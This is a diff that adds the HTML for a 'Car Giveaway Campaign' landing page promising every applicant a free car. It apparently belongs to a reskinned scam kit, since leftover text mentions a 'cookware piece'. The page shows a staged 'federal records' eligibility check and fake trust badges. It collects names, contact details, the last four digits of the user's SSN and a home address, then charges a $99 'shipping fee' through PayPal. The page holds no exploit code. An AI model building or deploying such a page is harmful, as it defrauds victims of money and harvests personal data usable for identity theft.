@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#071D41" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" />
+  <meta name="description" content="Car Giveaway Campaign — Every eligible applicant gets 1 free vehicle." />
+  <title>Car Giveaway Campaign — Free Vehicle</title>
+  <link rel="stylesheet" href="css/style.css" />
+
+  <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1335805395209469');
+  fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1335805395209469&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- End Meta Pixel Code -->
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="site-header">
+    <div class="container header-inner">
+      <a href="#" class="brand">
+        <img src="assets/logo.png" alt="Logo" class="brand-logo" width="111" height="40" />
+      </a>
+
+      <button class="cart-button" id="cartButton" aria-label="Open cart">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/>
+          <line x1="3" y1="6" x2="21" y2="6"/>
+          <path d="M16 10a4 4 0 0 1-8 0"/>
+        </svg>
+        <span class="cart-count" id="cartCount">0</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- BANNER CAROUSEL -->
+  <section class="banner-hero" id="about" aria-label="Car Giveaway Campaign">
+    <div class="carousel" id="bannerCarousel">
+      <div class="carousel-track" id="carouselTrack">
+
+        <!-- ═══ BANNER 1 — edit src and fallback content ═══ -->
+        <div class="carousel-slide">
+          <a href="#cars" class="banner-link">
+            <img
+              src="assets/banner1.png"
+              alt="Car Giveaway Campaign — Every eligible applicant gets 1 free vehicle"
+              class="banner-img"
+              fetchpriority="high"
+              onerror="this.classList.add('failed')"
+            />
+            <div class="banner-fallback" aria-hidden="true">
+              <div class="banner-fallback-inner">
+                <span class="banner-eyebrow">Car Giveaway Campaign 2026</span>
+                <h1 class="banner-title">Choose Your <em>Free Car</em></h1>
+                <p class="banner-tagline">Every eligible applicant gets <strong>1 free vehicle</strong></p>
+                <span class="banner-pill">Check eligibility</span>
+              </div>
+            </div>
+          </a>
+        </div>
+
+        <!-- ═══ BANNER 2 — edit src and fallback content ═══ -->
+        <div class="carousel-slide">
+          <a href="#cars" class="banner-link">
+            <img
+              src="assets/banner2.png"
+              alt="Car Giveaway Campaign — Every eligible applicant gets 1 free vehicle"
+              class="banner-img"
+              loading="lazy"
+              onerror="this.classList.add('failed')"
+            />
+            <div class="banner-fallback" aria-hidden="true">
+              <div class="banner-fallback-inner">
+                <span class="banner-eyebrow">Car Giveaway Campaign 2026</span>
+                <h1 class="banner-title">Choose Your <em>Free Car</em></h1>
+                <p class="banner-tagline">Every eligible applicant gets <strong>1 free vehicle</strong></p>
+                <span class="banner-pill">Check eligibility</span>
+              </div>
+            </div>
+          </a>
+        </div>
+
+        <!-- ═══ BANNER 3 — edit src and fallback content ═══ -->
+        <div class="carousel-slide">
+          <a href="#cars" class="banner-link">
+            <img
+              src="assets/banner3.png"
+              alt="Car Giveaway Campaign — Every eligible applicant gets 1 free vehicle"
+              class="banner-img"
+              loading="lazy"
+              onerror="this.classList.add('failed')"
+            />
+            <div class="banner-fallback" aria-hidden="true">
+              <div class="banner-fallback-inner">
+                <span class="banner-eyebrow">Car Giveaway Campaign 2026</span>
+                <h1 class="banner-title">Choose Your <em>Free Car</em></h1>
+                <p class="banner-tagline">Every eligible applicant gets <strong>1 free vehicle</strong></p>
+                <span class="banner-pill">Check eligibility</span>
+              </div>
+            </div>
+          </a>
+        </div>
+
+      </div><!-- /carousel-track -->
+
+      <!-- Indicators -->
+      <div class="carousel-dots" aria-label="Carousel navigation">
+        <button class="carousel-dot active" data-slide="0" aria-label="Banner 1"></button>
+        <button class="carousel-dot"        data-slide="1" aria-label="Banner 2"></button>
+        <button class="carousel-dot"        data-slide="2" aria-label="Banner 3"></button>
+      </div>
+    </div><!-- /carousel -->
+
+    <div class="container banner-cta">
+      <button type="button" class="btn-primary btn-block" id="eligCtaBtn">Check my eligibility</button>
+    </div>
+  </section>
+
+  <!-- HOW IT WORKS -->
+  <section class="how-section" id="how">
+    <div class="container">
+      <div class="section-header">
+        <span class="section-eyebrow">How It Works</span>
+        <h2 class="section-title">Simple, fast and free...</h2>
+      </div>
+
+      <div class="steps-grid">
+        <div class="step">
+          <div class="step-number">01</div>
+          <h3 class="step-title">Check your eligibility</h3>
+          <p class="step-text">Enter your name and ID to confirm you qualify as a beneficiary of this campaign.</p>
+        </div>
+        <div class="step">
+          <div class="step-number">02</div>
+          <h3 class="step-title">Choose your vehicle</h3>
+          <p class="step-text">Select 1 vehicle from the catalog and pay only the symbolic shipping fee.</p>
+        </div>
+        <div class="step">
+          <div class="step-number">03</div>
+          <h3 class="step-title">Receive at home</h3>
+          <p class="step-text">Your vehicle will be delivered to the address you provide.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PRODUCTS -->
+  <section class="products-section" id="cars">
+    <div class="container">
+      <div class="section-header">
+        <span class="section-eyebrow">Campaign Catalog</span>
+        <h2 class="section-title">Vehicles available for eligible applicants</h2>
+        <p class="section-sub">Limit of 1 vehicle per person. All vehicles are free.</p>
+      </div>
+
+      <div class="products-grid" id="productsGrid">
+        <!-- cards rendered by JS -->
+      </div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+
+    <!-- Trust badges -->
+    <div class="footer-trust">
+      <div class="container">
+        <ul class="trust-grid">
+          <li class="trust-item">
+            <span class="trust-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3Z"/>
+                <path d="m9 12 2 2 4-4"/>
+              </svg>
+            </span>
+            <div class="trust-text">
+              <strong>Secure Checkout</strong>
+              <span>SSL-protected site</span>
+            </div>
+          </li>
+
+          <li class="trust-item">
+            <span class="trust-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="4" y="11" width="16" height="10" rx="2"/>
+                <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+              </svg>
+            </span>
+            <div class="trust-text">
+              <strong>Data Protected</strong>
+              <span>Privacy policy compliant</span>
+            </div>
+          </li>
+
+          <li class="trust-item">
+            <span class="trust-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m3 9 9-6 9 6v6l-9 6-9-6V9Z"/>
+                <path d="M12 3v18"/>
+                <path d="m3 9 9 6 9-6"/>
+              </svg>
+            </span>
+            <div class="trust-text">
+              <strong>Safe Delivery</strong>
+              <span>Nationwide vehicle delivery</span>
+            </div>
+          </li>
+
+          <li class="trust-item">
+            <span class="trust-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="9" r="6"/>
+                <path d="m9 14-2 8 5-3 5 3-2-8"/>
+              </svg>
+            </span>
+            <div class="trust-text">
+              <strong>Official Guarantee</strong>
+              <span>Brand new vehicles only</span>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Brand + description -->
+    <div class="footer-main">
+      <div class="container">
+        <div class="footer-brand-block">
+          <div class="footer-brand">Auto Campaign LLC</div>
+          <p class="footer-tagline">Car Giveaway Campaign 2026 · United States</p>
+        </div>
+
+        <div class="footer-badges">
+          <span class="footer-badge">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <rect x="3" y="11" width="18" height="11" rx="2"/>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+            Verified site
+          </span>
+          <span class="footer-badge">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="m9 12 2 2 4-4"/>
+              <circle cx="12" cy="12" r="10"/>
+            </svg>
+            Human support
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bottom bar -->
+    <div class="footer-bottom">
+      <div class="container footer-bottom-inner">
+        <p class="footer-copy">© Auto Campaign LLC. All rights reserved.</p>
+        <div class="footer-links">
+          <a href="#about">About</a>
+          <span>·</span>
+          <a href="#how">How it works</a>
+          <span>·</span>
+          <a href="#cars">Vehicles</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- CART DRAWER -->
+  <div class="drawer-overlay" id="drawerOverlay"></div>
+
+  <aside class="drawer" id="drawer" aria-hidden="true" aria-label="Shopping cart">
+    <header class="drawer-header">
+      <div>
+        <h2 class="drawer-title">My cart</h2>
+        <p class="drawer-subtitle"><span id="drawerCount">0</span> of 1 item</p>
+      </div>
+      <button class="drawer-close" id="drawerClose" aria-label="Close cart">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <line x1="18" y1="6" x2="6" y2="18"/>
+          <line x1="6" y1="6" x2="18" y2="18"/>
+        </svg>
+      </button>
+    </header>
+
+    <div class="drawer-progress">
+      <div class="drawer-progress-bar" id="drawerProgress"></div>
+    </div>
+
+    <div class="drawer-body" id="drawerBody">
+      <!-- items rendered by JS -->
+    </div>
+
+    <footer class="drawer-footer">
+      <div class="drawer-summary">
+        <div class="drawer-total">
+          <span class="drawer-total-label">Items total</span>
+          <span class="drawer-total-value">$ 0.00</span>
+        </div>
+        <p class="drawer-note">Shipping will be calculated after you fill in your details.</p>
+      </div>
+      <button class="btn-primary btn-block" id="checkoutBtn" disabled>Checkout</button>
+    </footer>
+  </aside>
+
+  <!-- CHECKOUT MODAL -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+
+      <header class="modal-header">
+        <h2 class="modal-title" id="modalTitle">Checkout</h2>
+        <button class="modal-close" id="modalClose" aria-label="Close">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <line x1="18" y1="6" x2="6" y2="18"/>
+            <line x1="6" y1="6" x2="18" y2="18"/>
+          </svg>
+        </button>
+      </header>
+
+      <!-- Step 1 of 2: Personal information -->
+      <div class="modal-step" id="stepFormData">
+        <div class="modal-body">
+
+          <div class="checkout-step-indicator" aria-label="Step 1 of 2">
+            <span class="checkout-step-dot active"></span>
+            <span class="checkout-step-dot"></span>
+          </div>
+
+          <div class="modal-summary">
+            <span class="modal-summary-label">Selected item</span>
+            <ul class="modal-summary-list" id="modalSummaryList"></ul>
+          </div>
+
+          <p class="step-intro">Fill in your personal details to proceed.</p>
+          <p class="form-error" id="formDataError" hidden></p>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="fname">First Name</label>
+              <input type="text" id="fname" name="fname" autocomplete="given-name" required />
+            </div>
+            <div class="form-group">
+              <label for="lname">Last Name</label>
+              <input type="text" id="lname" name="lname" autocomplete="family-name" required />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="email">Email address</label>
+            <input type="email" id="email" name="email" autocomplete="email" inputmode="email" required />
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="phone">Phone number</label>
+              <input type="tel" id="phone" name="phone" placeholder="(555) 555-0000" autocomplete="tel" inputmode="numeric" required />
+            </div>
+            <div class="form-group">
+              <label for="cpf">SSN (last 4 digits)</label>
+              <input type="text" id="cpf" name="cpf" placeholder="XXXX" autocomplete="off" inputmode="numeric" maxlength="4" required />
+            </div>
+          </div>
+
+          <button type="button" class="btn-primary btn-block" id="formDataNext">Continue</button>
+        </div>
+      </div>
+
+      <!-- Step 2 of 2: Delivery address -->
+      <div class="modal-step" id="stepFormAddress" hidden>
+        <div class="modal-body">
+
+          <div class="checkout-step-indicator" aria-label="Step 2 of 2">
+            <span class="checkout-step-dot done"></span>
+            <span class="checkout-step-dot active"></span>
+          </div>
+
+          <p class="step-intro">Enter the delivery address for your vehicle.</p>
+          <p class="form-error" id="formAddressError" hidden></p>
+
+          <div class="form-row">
+            <div class="form-group form-group-cep">
+              <label for="cep">ZIP Code</label>
+              <input type="text" id="cep" name="cep" placeholder="12345" autocomplete="postal-code" inputmode="numeric" maxlength="5" required />
+              <p class="cep-status" id="cepStatus" hidden></p>
+            </div>
+            <div class="form-group">
+              <label for="street">Street Address</label>
+              <input type="text" id="street" name="street" placeholder="123 Main St" autocomplete="address-line1" required />
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group form-group-num">
+              <label for="number">Apt / Unit <span class="form-optional">optional</span></label>
+              <input type="text" id="number" name="number" placeholder="Apt 4B" autocomplete="address-line2" />
+            </div>
+            <div class="form-group">
+              <label for="city">City</label>
+              <input type="text" id="city" name="city" autocomplete="address-level2" required />
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group" style="display:none">
+              <input type="hidden" id="district" name="district" value="N/A" />
+            </div>
+            <div class="form-group form-group-state">
+              <label for="state">State</label>
+              <select id="state" name="state" required>
+                <option value="">Select</option>
+                <option value="AL">Alabama</option><option value="AK">Alaska</option>
+                <option value="AZ">Arizona</option><option value="AR">Arkansas</option>
+                <option value="CA">California</option><option value="CO">Colorado</option>
+                <option value="CT">Connecticut</option><option value="DE">Delaware</option>
+                <option value="FL">Florida</option><option value="GA">Georgia</option>
+                <option value="HI">Hawaii</option><option value="ID">Idaho</option>
+                <option value="IL">Illinois</option><option value="IN">Indiana</option>
+                <option value="IA">Iowa</option><option value="KS">Kansas</option>
+                <option value="KY">Kentucky</option><option value="LA">Louisiana</option>
+                <option value="ME">Maine</option><option value="MD">Maryland</option>
+                <option value="MA">Massachusetts</option><option value="MI">Michigan</option>
+                <option value="MN">Minnesota</option><option value="MS">Mississippi</option>
+                <option value="MO">Missouri</option><option value="MT">Montana</option>
+                <option value="NE">Nebraska</option><option value="NV">Nevada</option>
+                <option value="NH">New Hampshire</option><option value="NJ">New Jersey</option>
+                <option value="NM">New Mexico</option><option value="NY">New York</option>
+                <option value="NC">North Carolina</option><option value="ND">North Dakota</option>
+                <option value="OH">Ohio</option><option value="OK">Oklahoma</option>
+                <option value="OR">Oregon</option><option value="PA">Pennsylvania</option>
+                <option value="RI">Rhode Island</option><option value="SC">South Carolina</option>
+                <option value="SD">South Dakota</option><option value="TN">Tennessee</option>
+                <option value="TX">Texas</option><option value="UT">Utah</option>
+                <option value="VT">Vermont</option><option value="VA">Virginia</option>
+                <option value="WA">Washington</option><option value="WV">West Virginia</option>
+                <option value="WI">Wisconsin</option><option value="WY">Wyoming</option>
+              </select>
+            </div>
+          </div>
+
+          <button type="button" class="btn-primary btn-block" id="formAddressNext">Review order</button>
+          <button type="button" class="btn-link" id="formAddressBack">Back to personal info</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Order review -->
+      <div class="modal-step" id="stepReview" hidden>
+        <div class="modal-body">
+
+          <div class="review-section">
+            <span class="review-section-label">Selected items</span>
+            <ul class="review-items" id="reviewItems"></ul>
+          </div>
+
+          <div class="review-section">
+            <span class="review-section-label">Delivery address</span>
+            <div class="review-address" id="reviewAddress"></div>
+          </div>
+
+          <div class="review-summary">
+            <div class="review-line">
+              <span>Items subtotal</span>
+              <strong>$ 0.00</strong>
+            </div>
+            <div class="review-line">
+              <span id="reviewShippingLabel">Shipping</span>
+              <strong>$ 99.00</strong>
+            </div>
+            <div class="review-total">
+              <span>Total due</span>
+              <span class="review-total-value">$ 99.00</span>
+            </div>
+          </div>
+
+          <p class="form-error" id="reviewError" hidden></p>
+
+          <button type="button" class="btn-primary btn-block" id="reviewPay">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="vertical-align:middle;margin-right:6px"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+            Pay with PayPal
+          </button>
+          <button type="button" class="btn-link" id="reviewBack">Back and edit details</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ELIGIBILITY MODAL -->
+  <div class="elig-overlay" id="eligOverlay">
+    <div class="elig-modal" role="dialog" aria-modal="true" aria-labelledby="eligTitle">
+
+      <!-- Step 1: Form -->
+      <div class="elig-step" id="eligStepForm">
+        <div class="elig-modal-header">
+          <div class="elig-icon-wrap" aria-hidden="true">
+            <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3Z"/>
+              <path d="m9 12 2 2 4-4"/>
+            </svg>
+          </div>
+          <h2 class="elig-title" id="eligTitle">Check Eligibility</h2>
+          <p class="elig-desc">Enter your full name and ID number to verify if you qualify to receive a free cookware piece in this campaign.</p>
+        </div>
+
+        <form id="eligForm" class="elig-form" novalidate>
+          <p class="form-error" id="eligError" hidden></p>
+
+          <div class="form-group">
+            <label for="eligName">Full name</label>
+            <input type="text" id="eligName" name="eligName" autocomplete="name" placeholder="Your full name" required />
+          </div>
+
+          <div class="form-group">
+            <label for="eligCpf">SSN (last 4 digits)</label>
+            <input type="text" id="eligCpf" name="eligCpf" placeholder="XXXX" inputmode="numeric" autocomplete="off" maxlength="4" required />
+          </div>
+
+          <div class="form-group">
+            <label>Marital status</label>
+            <div class="elig-civil-group" id="eligCivilGroup" role="radiogroup" aria-label="Marital status">
+              <button type="button" class="elig-civil-btn" data-value="single" aria-pressed="false">
+                <span class="elig-civil-icon" aria-hidden="true">
+                  <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="8" r="4"/>
+                    <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
+                  </svg>
+                </span>
+                <span class="elig-civil-label">Single</span>
+              </button>
+              <button type="button" class="elig-civil-btn" data-value="student" aria-pressed="false">
+                <span class="elig-civil-icon" aria-hidden="true">
+                  <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 10v6M2 10l10-5 10 5-10 5z"/>
+                    <path d="M6 12v5c0 1.7 2.7 3 6 3s6-1.3 6-3v-5"/>
+                  </svg>
+                </span>
+                <span class="elig-civil-label">Student</span>
+              </button>
+            </div>
+          </div>
+
+          <button type="submit" class="btn-primary btn-block" id="eligSubmit" style="display:flex;align-items:center;justify-content:center;gap:8px;">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <circle cx="11" cy="11" r="8"/>
+              <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+            </svg>
+            Check eligibility
+          </button>
+        </form>
+
+        <p class="elig-privacy">
+          <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect x="4" y="11" width="16" height="10" rx="2"/>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+          </svg>
+          Your data is protected in accordance with our Privacy Policy
+        </p>
+      </div>
+
+      <!-- Step 2: Verifying / Loading -->
+      <div class="elig-step" id="eligStepLoading" hidden>
+        <div class="elig-loading-header">
+          <div class="elig-loading-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3Z"/>
+            </svg>
+          </div>
+          <h2 class="elig-title">Verifying your information</h2>
+          <p class="elig-desc">Please wait while we check the official systems...</p>
+        </div>
+
+        <div class="elig-overall-track" role="progressbar" aria-label="Verification progress">
+          <div class="elig-overall-fill" id="eligOverallFill"></div>
+        </div>
+
+        <ul class="elig-check-list" aria-live="polite">
+          <li class="elig-check-item">
+            <span class="elig-check-icon"></span>
+            <span class="elig-check-label">Verifying ID in federal records</span>
+          </li>
+          <li class="elig-check-item">
+            <span class="elig-check-icon"></span>
+            <span class="elig-check-label">Checking beneficiary registry</span>
+          </li>
+          <li class="elig-check-item">
+            <span class="elig-check-icon"></span>
+            <span class="elig-check-label">Verifying eligibility as a campaign beneficiary</span>
+          </li>
+          <li class="elig-check-item">
+            <span class="elig-check-icon"></span>
+            <span class="elig-check-label">Confirming campaign inventory availability</span>
+          </li>
+        </ul>
+      </div>
+
+      <!-- Step 3: Approved -->
+      <div class="elig-step" id="eligStepApproved" hidden>
+        <div class="elig-approved">
+          <div class="elig-approved-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <h2 class="elig-title">Congratulations, <span id="eligApprovedName"></span>!</h2>
+          <p class="elig-desc">Your eligibility has been confirmed. You may choose <strong>1 vehicle</strong> for free in this campaign.</p>
+
+          <div class="elig-approved-details">
+            <div class="elig-approved-detail">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                <path d="m9 12 2 2 4-4"/><circle cx="12" cy="12" r="10"/>
+              </svg>
+              <span>ID successfully validated</span>
+            </div>
+            <div class="elig-approved-detail">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                <path d="m9 12 2 2 4-4"/><circle cx="12" cy="12" r="10"/>
+              </svg>
+              <span>Eligible for 1 free vehicle</span>
+            </div>
+            <div class="elig-approved-detail">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                <path d="m9 12 2 2 4-4"/><circle cx="12" cy="12" r="10"/>
+              </svg>
+              <span>Campaign stock available</span>
+            </div>
+          </div>
+
+          <button type="button" class="btn-primary btn-block" id="eligApprovedBtn" style="display:flex;align-items:center;justify-content:center;gap:8px;">
+            Choose my vehicle
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <line x1="5" y1="12" x2="19" y2="12"/>
+              <polyline points="12 5 19 12 12 19"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- TOAST -->
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <!-- COOKIE CONSENT -->
+  <div class="cookie-banner" id="cookieBanner" role="dialog" aria-live="polite" aria-label="Cookie notice" hidden>
+    <div class="cookie-banner-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 12a9 9 0 1 1-9-9 4 4 0 0 0 4 4 4 4 0 0 0 4 4 4.5 4.5 0 0 0 1 1Z"/>
+        <circle cx="8.5" cy="13.5" r="0.6" fill="currentColor"/>
+        <circle cx="13" cy="9" r="0.6" fill="currentColor"/>
+        <circle cx="14" cy="15.5" r="0.6" fill="currentColor"/>
+        <circle cx="9.5" cy="9" r="0.6" fill="currentColor"/>
+      </svg>
+    </div>
+    <div class="cookie-banner-content">
+      <h3 class="cookie-banner-title">Cookies</h3>
+      <p class="cookie-banner-text">We use cookies to provide the best experience on this site.</p>
+    </div>
+    <button type="button" class="cookie-btn-accept" id="cookieAccept">Accept</button>
+  </div>
+
+  <!-- SCRIPTS -->
+  <script src="js/carousel.js"></script>
+  <script src="js/tracking.js"></script>
+  <script src="js/products.js"></script>
+  <script src="js/validators.js"></script>
+  <script src="js/ui.js"></script>
+  <script src="js/cart.js"></script>
+  <script src="js/eligibility.js"></script>
+  <script src="js/checkout.js"></script>
+  <script src="js/main.js"></script>
+
+</body>
+</html>
